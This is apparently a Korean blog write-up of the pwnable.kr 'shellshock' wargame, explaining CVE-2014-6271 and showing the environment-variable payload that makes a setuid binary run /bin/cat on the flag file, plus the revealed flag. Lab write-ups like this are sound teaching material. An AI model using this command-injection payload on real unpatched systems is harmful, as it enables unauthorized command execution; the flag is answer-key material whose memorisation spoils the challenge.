---
title: "[Pwnable.kr] Toddler's Bottle - shellshock 문제풀이"
date: 2019-02-13
draft: false
category: [wargame]
subcategories: [pwnable.kr]
tags: [Write-up, Pwnable.kr]
---

밤에 바로 잘까 하다가 갑자기 1pt 짜리 shellshcok 문제가 있었다는 것이 생각나 후딱 풀어보았다.
예전에 CTF에서 나왔던 걸 풀어봐서인지 금방 풀 수 있었다.  

<!--more-->
  
문제 접속 정보는 아래와 같다.

```plain
ssh shellshock@pwnable.kr -p2222 (pw:guest)
```

문제에 접속하면 4개의 파일을 확인할 수 있다.  

> -r-xr-xr-x  1 root shellshock     959120 Oct 12  2014 bash  
> -r--r-----  1 root shellshock_pwn     47 Oct 12  2014 flag  
> -r-xr-sr-x  1 root shellshock_pwn   8547 Oct 12  2014 shellshock  
> -r--r--r--  1 root root              188 Oct 12  2014 shellshock.c  

다른 문제들이랑 동일하게 실행파일, 소스코드, flag 파일이 있고, 이번에는 추가적으로 `bash`가 있다.
`shellshock.c`의 내용은 다음과 같다.  

```c
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```

소스코드가 굉장히 짧다.
다른 문제들에 비해 비교적 간단한데 이 중 주의깊게 봐야 할 부분은 `system()` 함수를 호출하는 부분이다.

`system()` 함수를 호출 해 `/home/shellshock/bash -c 'echo shock_me`를 실행시킨다.
즉 현재 디렉토리에 있는 `bash`를 통해 `echo shock_me`를 실행시키는 것이다.
`shellshock` 취약점은 하도 유명한 취약점이라 한번쯤은 이름이라도 들어봤을 것 같다.
그래서 현재 디렉토리에 있는 `bash`가 `shellshock` 취약점을 사용할 수 있는 버전인지 확인을 해 보았다.
먼저 그냥 `bash`의 버전을 확인 해 보면 `4.3.48`로 `shellshock` 취약점에 취약한 버전이 아니다.  

```bash
shellshock@ubuntu:~$ bash --version
GNU bash, version 4.3.48(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2013 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

하지만 현재 디렉토리에 있는 `bash`의 버전은 `4.2.25`로 `shellshock`에 취약하다.  

```bash
shellshock@ubuntu:~$ ./bash --version
GNU bash, version 4.2.25(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2011 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

그렇다면 `shellshock.c`에서 `shellshock` 취약점을 사용할 수 있는 현재 디렉토리의 `bash`를 사용 해 특정 명령어를 실행하니, `shellshock` 취약점을 사용 해 `flag`를 읽으면 될 것 같다.
일단 `shellshock` 취약점을 테스트 해 볼 수 있는 방법은 다음과 같다.  

```bash
$ ​$ env x='() { :; }; echo test' bash -c "echo test2"
test
test2
```

특정 환경변수에 위와 같이 값을 입력한 후, `shellshock`에 취약한 `bash`를 실행시키면 함수의 종료부인 `;` 뒤의 추가적인 명령어 (위의 예시에서는 `echo test`)가 실행되는 것이다.
(echo test2가 출력되는 이유는 새로운 bash를 이용 해 echo test2 명령어를 실행시켰기 때문이다.  

처음에는 이게 왜 실행되는지 잘 이해가 되지 않았다.
그래서 더 찾아보다가 취약점의 원인에 대해 잘 잘 설명한 블로그 글을 찾았다.  

> [Shellshock 설명 블로그](https://operatingsystems.tistory.com/entry/Shellshock-CVE20146271)  

위의 블로그에 따르면, `bash process`가 동작하는 순서는 다음과 같다.  

```plain
1. bash 실행
2. bash 환경변수 초기화
3. bash shell prompt 출력
4. 명령어 대기
5. (명령어 수행할 경우) 명령어를 문자열로 저장 해 해당 문자열 파싱
6. 파싱 된 구초제를 이용 해 명령어 수행
```

이 때, `shellshock` 취약점은 `2번` 과정에서 발생한다.
환경변수를 초기화 할 때 함수의 종료를 의미하는 `;`를 끝으로 더 이상 인식하지 말아야하는데 이를 제대로 파악하지 못해 그 뒤의 명령어가 실행되는 취약점이다.  

다른 예를 들어 설명하면, `export x='() { echo test; }; echo test2'`에서 `export x='() { echo test; };`만을 환경변수 `x`의 값으로 넣어, `x` 실행 시 `echo test`가 나오도록 하고 나머지 부분은 무시하거나 따로 처리하도록 해야 하는데, `;` 뒤의 `echo test2`를 명령어로 인식하여 새로운 `bash` 실행 시 `echo test2`가 실행되는 것이다.
이를 테스트 해 보면 다음과 같다.  

```bash
shellshock@ubuntu:~$ export x='() { echo test; }; echo test2'
shellshock@ubuntu:~$ ./bash
test2
shellshock@ubuntu:~$ x
test
```

원래의 `bash`에서 `x` 환경변수를 등록한 후 취약한 버전의 `bash`를 실행하면 자동으로 `echo test2`가 실행된다.
새로운 `bash`가 실행되며 `x` 환경변수는 초기화 되었으므로 `x`의 값은 새로운 `bash`에서 `echo test`를 실행하는 함수로 설정되어 있어, `x` 실행 시 `echo test`가 실행된다.

그렇다면 문제로 돌아가서, `shellshock.c` 코드에서는 취약한 버전의 `bash`를 새로 실행한다.
또한 권한을 확인 해 보았을 때 `shellshock` 실행파일에 `SetUID`가 걸려있으므로, 해당 실행 파일의 권한을 이용 해 `bash`를 실행한다면, `flag` 또한 읽을 수 있다.
그래서 x라는 이름으로 아래와 같은 환경변수를 등록했다.    

```bash
shellshock@ubuntu:~$ export x='() { echo test; }; /bin/cat flag'
```

그러면 `shellshock` 실행파일에서 `system("/home/shellshock/bash -c 'echo shock_me'");`를 실행하며 새로운 `bash`를 실행시킬 것이며, 이 때 환경변수를 초기화 하며 `x`는 `echo test`를 실행하는 함수가 저장 될 것이다.
또한 `;` 뒤의 `/bin/cat flag` 명령어를 실행하게 될 것이다.
이 후 `shellshock`를 실행 해 본 결과 아래와 같이 플래그를 얻을 수 있었다. ㅎㅎ  

![](/images/pwnable.kr/shellshock/shellshock_01.PNG)

```bash
shellshock@ubuntu:~$ export x='() { echo test; }; /bin/cat flag'
shellshock@ubuntu:~$ ./shellshock 
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault
```

---

```plain
FLAG : only if I knew CVE-2014-6271 ten years ago..!!
```
